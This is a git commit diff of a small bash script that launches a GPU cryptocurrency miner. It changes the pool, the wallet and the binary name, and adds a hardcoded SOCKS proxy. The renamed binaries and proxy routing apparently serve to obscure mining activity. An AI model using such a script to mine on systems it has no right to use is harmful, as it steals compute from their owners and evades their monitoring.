e6b9c97989f1bae6f79cb2aa75cb36c0a8348cb0
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-10-12 21:10:00 -0700

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=BTT:TD7L1BXFTy1qq7VxAc2pPR2eQCZFHFzyXo
-WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)
-chmod +x tuyulgpu
+POOL=gibs.cash:1690
+WALLET=5320a7d08b9e47885342da48e743a4d9268ca0d74c58ae68e85d74a0560a539f50
+WORKER=$(echo $(shuf -i 1-9999 -n 1)-GPU)
+chmod +x vexzo
 
-./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
+./vexzo --url ssl://$WALLET.$WORKER@$POOL --par=150,5 --pers=Beam-PoW --socks=98.162.25.7:31653 
